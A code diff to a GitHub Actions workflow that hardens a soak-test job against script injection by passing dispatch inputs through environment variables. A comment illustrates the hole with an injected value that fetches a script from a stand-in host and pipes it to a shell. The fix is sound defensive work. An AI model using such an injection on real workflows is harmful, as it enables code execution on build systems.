@@ -31,11 +31,19 @@ jobs:
         with:
           python-version: "3.12"
       - run: pip install uv && uv venv && uv pip install -e ".[dev]"
+      # The dispatch inputs are free text. Interpolating `${{ ... }}` straight
+      # into `run:` lets the Actions templater substitute BEFORE the shell
+      # parses, so `"; curl evil.sh | sh; "` would execute. Passing them
+      # through `env:` and quoting makes them shell data, never shell code.
+      # (release.yml already does this correctly with $GITHUB_REF_NAME.)
       - name: Soak (load + periodic broker kills + leak tracking)
+        env:
+          SOAK_DURATION: ${{ github.event.inputs.duration || 1800 }}
+          SOAK_RESTART_EVERY: ${{ github.event.inputs.restart_every || 180 }}
         run: |
           .venv/bin/python -m benchmarks.soak \
-            --duration "${{ github.event.inputs.duration || 1800 }}" \
-            --restart-every "${{ github.event.inputs.restart_every || 180 }}"
+            --duration "$SOAK_DURATION" \
+            --restart-every "$SOAK_RESTART_EVERY"
       - name: Upload soak report
         if: always()
         uses: actions/upload-artifact@v7
